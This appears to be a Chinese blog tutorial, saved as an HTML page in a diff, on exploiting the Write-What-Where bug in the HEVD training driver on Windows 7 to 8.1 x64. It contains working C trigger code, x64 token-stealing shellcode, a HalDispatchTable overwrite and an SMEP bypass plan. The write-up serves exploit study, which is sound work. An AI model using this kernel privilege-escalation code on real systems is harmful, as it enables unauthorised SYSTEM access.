@@ -1,0 +1,1508 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=6.4.2" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.4.2">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=6.4.2">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.4.2">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.4.2" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '6.4.2',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="0x00：前言本篇文章主要分享HEVD这个Windows内核漏洞训练项目中的Write-What-Where漏洞在win7 x64到win10 x64 1605的一个爬坑过程，Windows内核漏洞的原理比较简单，关键点在于exp的编写，这里我从win7 x64开始说起，看此文章之前你需要有以下准备：  Windows相应版本的虚拟机 配置好windbg等调试工具，建议配合VirtualKD使用">
+<meta name="keywords" content="Write What Where">
+<meta property="og:type" content="article">
+<meta property="og:title" content="www漏洞从win7-win10">
+<meta property="og:url" content="http://yoursite.com/2019/08/19/www漏洞从win7-win10/index.html">
+<meta property="og:site_name" content="Thunder_J">
+<meta property="og:description" content="0x00：前言本篇文章主要分享HEVD这个Windows内核漏洞训练项目中的Write-What-Where漏洞在win7 x64到win10 x64 1605的一个爬坑过程，Windows内核漏洞的原理比较简单，关键点在于exp的编写，这里我从win7 x64开始说起，看此文章之前你需要有以下准备：  Windows相应版本的虚拟机 配置好windbg等调试工具，建议配合VirtualKD使用">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://yoursite.com/2019/08/19/www漏洞从win7-win10/1.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/19/www漏洞从win7-win10/2.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/19/www漏洞从win7-win10/3.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/19/www漏洞从win7-win10/5.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/19/www漏洞从win7-win10/6.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/19/www漏洞从win7-win10/7.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/19/www漏洞从win7-win10/12.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/19/www漏洞从win7-win10/8.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/19/www漏洞从win7-win10/13.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/19/www漏洞从win7-win10/9.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/19/www漏洞从win7-win10/10.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/19/www漏洞从win7-win10/11.png">
+<meta property="og:updated_time" content="2019-08-22T15:50:22.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="www漏洞从win7-win10">
+<meta name="twitter:description" content="0x00：前言本篇文章主要分享HEVD这个Windows内核漏洞训练项目中的Write-What-Where漏洞在win7 x64到win10 x64 1605的一个爬坑过程，Windows内核漏洞的原理比较简单，关键点在于exp的编写，这里我从win7 x64开始说起，看此文章之前你需要有以下准备：  Windows相应版本的虚拟机 配置好windbg等调试工具，建议配合VirtualKD使用">
+<meta name="twitter:image" content="http://yoursite.com/2019/08/19/www漏洞从win7-win10/1.png">
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Thunder_J" type="application/atom+xml">
+
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/08/19/www漏洞从win7-win10/">
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>www漏洞从win7-win10 | Thunder_J</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+<a href="https://your-url" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewbox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Thunder_J</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">Just for fun</p>
+      
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+  </li>
+
+      
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+  
+
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/19/www漏洞从win7-win10/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Thunder_J">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Thunder_J">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">www漏洞从win7-win10
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+		
+		
+
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-08-19 22:22:39" itemprop="dateCreated datePublished" datetime="2019-08-19T22:22:39+08:00">2019-08-19</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-08-22 23:50:22" itemprop="dateModified" datetime="2019-08-22T23:50:22+08:00">2019-08-22</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Windows-Kernel/" itemprop="url" rel="index"><span itemprop="name">Windows Kernel</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="post-meta-item-icon">
+            <i class="fa fa-eye"></i>
+             阅读次数： 
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+            <div class="post-symbolscount">
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">本文字数：</span>
+                
+                <span title="本文字数">30k</span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">27 分钟</span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="0x00：前言"><a href="#0x00：前言" class="headerlink" title="0x00：前言"></a>0x00：前言</h1><p>本篇文章主要分享HEVD这个Windows内核漏洞训练项目中的Write-What-Where漏洞在win7 x64到win10 x64 1605的一个爬坑过程，Windows内核漏洞的原理比较简单，关键点在于exp的编写，这里我从win7 x64开始说起，看此文章之前你需要有以下准备：</p>
+<ul>
+<li>Windows相应版本的虚拟机</li>
+<li>配置好windbg等调试工具，建议配合VirtualKD使用</li>
+<li>HEVD+OSR Loader配合构造漏洞环境</li>
+</ul>
+<p>如果你不是很清楚这个漏洞的基本原理的话，你可以从我的<a href="https://xz.aliyun.com/t/5615" target="_blank" rel="noopener">另一篇文章</a>了解到这个漏洞的原理以及在win 7 x86下的利用，我这里就不多加赘述了</p>
+<h1 id="0x01：Windows-7-x64利用"><a href="#0x01：Windows-7-x64利用" class="headerlink" title="0x01：Windows 7 x64利用"></a>0x01：Windows 7 x64利用</h1><p>让我们简单回顾一下在Windows 7 x86下我们利用的利用思路和关键代码，全部的代码参考 =&gt; <a href="https://github.com/ThunderJie/Windows-Kernel-Exploit/blob/master/HEVD/ArbitraryOverwrite/ArbitraryOverwrite/test.c" target="_blank" rel="noopener">这里</a></p>
+<p><strong>利用思路</strong></p>
+<ul>
+<li>初始化句柄等结构</li>
+<li>计算我们需要Hook的地址<code>HalDispatchTable+0x4</code></li>
+<li>调用<code>TriggerArbitraryOverwrite</code>函数将<code>shellcode</code>地址放入Hook地址</li>
+<li>调用<code>NtQueryIntervalProfile</code>函数触发漏洞</li>
+<li>调用cmd验证提权结果</li>
+</ul>
+<p><strong>关键代码</strong></p>
+<p>计算Hook地址</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD32 <span class="title">GetHalOffset_4</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// ntkrnlpa.exe in kernel space base address</span></span><br><span class="line">	PVOID pNtkrnlpaBase = NtkrnlpaBase();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[+]ntkrnlpa base address is 0x%p\n"</span>, pNtkrnlpaBase);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// ntkrnlpa.exe in user space base address</span></span><br><span class="line">	HMODULE hUserSpaceBase = LoadLibrary(<span class="string">"ntkrnlpa.exe"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// HalDispatchTable in user space address</span></span><br><span class="line">	PVOID pUserSpaceAddress = GetProcAddress(hUserSpaceBase, <span class="string">"HalDispatchTable"</span>);</span><br><span class="line"></span><br><span class="line">	DWORD32 hal_4 = (DWORD32)pNtkrnlpaBase + ((DWORD32)pUserSpaceAddress - (DWORD32)hUserSpaceBase) + <span class="number">0x4</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[+]HalDispatchTable+0x4 is 0x%p\n"</span>, hal_4);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> (DWORD32)hal_4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>调用问题函数执行shellcode</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">NtQueryIntervalProfile_t NtQueryIntervalProfile = (NtQueryIntervalProfile_t)GetProcAddress(LoadLibraryA(<span class="string">"ntdll.dll"</span>), <span class="string">"NtQueryIntervalProfile"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+]NtQueryIntervalProfile address is 0x%x\n"</span>, NtQueryIntervalProfile);</span><br><span class="line">NtQueryIntervalProfile(<span class="number">0x1337</span>, &amp;interVal);</span><br></pre></td></tr></table></figure>
+<p>总所周知Windows 7 x64是64位的，所以我们很快的就可以想到和32位的不同，所以我们在32位的基础上只需要改一下长度应该就可以拿到system权限了，实际上还是有很多坑的，这里我分享几个我遇到的坑，第一个就是我们的shellcode需要修改，因为是64位，所以偏移都会有改变，但是原理是不会变的</p>
+<ul>
+<li>当前线程中找到<code>_KTHREAD</code>结构体</li>
+<li>找到<code>_EPROCESS</code>结构体</li>
+<li>找到当前线程的token</li>
+<li>循环便利链表找到system系统的token</li>
+<li>替换token</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">	mov		rax, gs:[188h]</span><br><span class="line">	mov		rax, [rax+210h]</span><br><span class="line">	mov     rcx, rax</span><br><span class="line">	mov     rdx, 4</span><br><span class="line"></span><br><span class="line">findSystemPid:</span><br><span class="line">    mov    rax, [rax+188h]</span><br><span class="line">    sub    rax, 188h</span><br><span class="line">    cmp    [rax+180h], rdx</span><br><span class="line">    jnz findSystemPid</span><br><span class="line"></span><br><span class="line">    mov rdx, [rax+0208h]</span><br><span class="line">    mov [rcx+0208h], rdx</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure>
+<p><strong>Shellcode在64位下的编译</strong></p>
+<p>首先第一个就是shellcode如何放置在64位的编译环境下，如果是像32位那样直接在代码中嵌入汇编是行不通的，这里我们需要以下几步来嵌入汇编代码(我使用的环境是VS2019，当然以前的版本也可以)</p>
+<ol>
+<li>项目源文件中多创建一个ShellCode.asm文件，放入我们的shellcode</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.code</span><br><span class="line">ShellCode proc</span><br><span class="line">	mov		rax, gs:[188h]</span><br><span class="line">	mov		rax, [rax+210h]</span><br><span class="line">	mov     rcx, rax</span><br><span class="line">	mov     rdx, 4</span><br><span class="line"></span><br><span class="line">findSystemPid:</span><br><span class="line">    mov    rax, [rax+188h]</span><br><span class="line">    sub    rax, 188h</span><br><span class="line">    cmp    [rax+180h], rdx</span><br><span class="line">    jnz findSystemPid</span><br><span class="line"></span><br><span class="line">    mov rdx, [rax+0208h]</span><br><span class="line">    mov [rcx+0208h], rdx</span><br><span class="line">    ret</span><br><span class="line"></span><br><span class="line">ShellCode endp</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>右键ShellCode.asm文件，点击属性，生成中排除选择否，项类型选择自定义生成工具</li>
+</ol>
+<p><img src="/2019/08/19/www漏洞从win7-win10/1.png" alt="1564740624883"></p>
+<ol start="3">
+<li>在自定义工具里面的命令行和输出填写如下内容</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ml64 /c %(filename).asm</span><br><span class="line">%(filename).obj;%(outputs)</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/08/19/www漏洞从win7-win10/2.png" alt="1564743547152"></p>
+<ol start="4">
+<li>在ShellCode.h中申明如下内容，然后在主利用函数中引用即可</li>
+</ol>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ShellCode</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure>
+<p><strong>shellcode的放置</strong></p>
+<p>第二个坑就是shellcode的放置，在x86中我们是如下方法实现shellcode的放置</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">VOID <span class="title">Trigger_shellcode</span><span class="params">(DWORD32 where, DWORD32 what)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	WRITE_WHAT_WHERE exploit;</span><br><span class="line">	DWORD lpbReturn = <span class="number">0</span>;</span><br><span class="line">	exploit.Where = (PVOID)where;</span><br><span class="line">	exploit.What = (PVOID)&amp; what;</span><br><span class="line">    </span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[+]Write at 0x%p\n"</span>, where);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[+]Write with 0x%p\n"</span>, what);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[+]Start to trigger...\n"</span>);</span><br><span class="line">    </span><br><span class="line">	DeviceIoControl(hDevice,</span><br><span class="line">		<span class="number">0x22200B</span>,</span><br><span class="line">		&amp;exploit,</span><br><span class="line">		<span class="keyword">sizeof</span>(WRITE_WHAT_WHERE),</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="number">0</span>,</span><br><span class="line">		&amp;lpbReturn,</span><br><span class="line">		<span class="literal">NULL</span>);</span><br><span class="line">    </span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[+]Success to trigger...\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>因为我们现在是<code>qword</code>而不是<code>dword</code>，也就是说我们需要调用两次才能将我们的地址完全写进去，所以构造出如下的片段</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">VOID <span class="title">Trigger_shellcode</span><span class="params">(UINT64 where, UINT64 what)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	WRITE_WHAT_WHERE exploitlow;</span><br><span class="line">	WRITE_WHAT_WHERE exploithigh;</span><br><span class="line">	DWORD lpbReturn = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	UINT32 lowValue = what;</span><br><span class="line">	UINT32 highvalue = (what &gt;&gt; <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">	exploitlow.What = (PULONG_PTR)&amp; what;</span><br><span class="line">	exploitlow.Where = (PULONG_PTR)where;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[+]Start to trigger "</span>);</span><br><span class="line"></span><br><span class="line">	DeviceIoControl(hDevice,</span><br><span class="line">		<span class="number">0x22200B</span>,</span><br><span class="line">		&amp;exploitlow,</span><br><span class="line">		<span class="number">0x10</span>,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="number">0</span>,</span><br><span class="line">		&amp;lpbReturn,</span><br><span class="line">		<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	exploithigh.What = (PULONG_PTR)&amp; highvalue;</span><br><span class="line">	exploithigh.Where = (PULONG_PTR)(where + <span class="number">0x4</span>);</span><br><span class="line"></span><br><span class="line">	DeviceIoControl(hDevice,</span><br><span class="line">		<span class="number">0x22200B</span>,</span><br><span class="line">		&amp;exploithigh,</span><br><span class="line">		<span class="number">0x10</span>,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="number">0</span>,</span><br><span class="line">		&amp;lpbReturn,</span><br><span class="line">		<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"=&gt; done!\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>最后整合一下代码即可实现利用，整体代码和验证结果参考 =&gt; <a href="https://github.com/ThunderJie/Write-What-Where" target="_blank" rel="noopener">这里</a></p>
+<h1 id="0x02：Windows-8-1-x64利用"><a href="#0x02：Windows-8-1-x64利用" class="headerlink" title="0x02：Windows 8.1 x64利用"></a>0x02：Windows 8.1 x64利用</h1><p>好了win7我们已经完成了利用，我们开始研究win8下的利用，首先我们需要了解一些win8的安全机制，我们拿在win7 x64下的exp直接拖入win8运行观察会发生什么，果不其然蓝屏了，我们查看一下在windbg中的分析</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">*** Fatal System Error: 0x000000fc</span><br><span class="line">                       (0x00007FF6F3B31400,0x1670000089B30025,0xFFFFD000210577E0,0x0000000080000005)</span><br><span class="line"></span><br><span class="line">Break instruction exception - code 80000003 (first chance)</span><br><span class="line">...</span><br><span class="line">0: kd&gt; !analyze -v</span><br><span class="line">*******************************************************************************</span><br><span class="line">*                                                                             *</span><br><span class="line">*                        Bugcheck Analysis                                    *</span><br><span class="line">*                                                                             *</span><br><span class="line">*******************************************************************************</span><br><span class="line"></span><br><span class="line">ATTEMPTED_EXECUTE_OF_NOEXECUTE_MEMORY (fc) // 关注点</span><br><span class="line">An attempt was made to execute non-executable memory.  The guilty driver</span><br><span class="line">is on the stack trace (and is typically the current instruction pointer).</span><br><span class="line">When possible, the guilty driver&apos;s name (Unicode string) is printed on</span><br><span class="line">the bugcheck screen and saved in KiBugCheckDriver.</span><br><span class="line">Arguments:</span><br><span class="line">Arg1: 00007ff6f3b31400, Virtual address for the attempted execute.</span><br><span class="line">Arg2: 1670000089b30025, PTE contents.</span><br><span class="line">Arg3: ffffd000210577e0, (reserved)</span><br><span class="line">Arg4: 0000000080000005, (reserved)</span><br></pre></td></tr></table></figure>
+<p>windbg中提示<code>ATTEMPTED_EXECUTE_OF_NOEXECUTE_MEMORY</code>这个错误，我们解读一下这句话，企图执行不可执行的内存，等等，这不就是我们pwn中的NX保护吗</p>
+<h2 id="SMEP"><a href="#SMEP" class="headerlink" title="SMEP"></a>SMEP</h2><p>我们详细来了解一下这个保护机制，SMEP保护开启的时候我们用户层的代码不能在内核层中执行，也就是说我们的shellcode不能得到执行</p>
+<p><img src="/2019/08/19/www漏洞从win7-win10/3.png" alt="1564814968337"></p>
+<p>这个时候我们回想一下绕过NX的方法，瞬间就想到了ROP，那么我们现在是要拿ROP帮我们做哪些事情呢？我们看下面这张图，可以看到我们的SMEP标志位在第20位，也就是说我们只需要将cr4寄存器修改为关闭SMEP的状态即可运行我们的shellcode了</p>
+<p><img src="/2019/08/19/www漏洞从win7-win10/5.png" alt="1564815377766"></p>
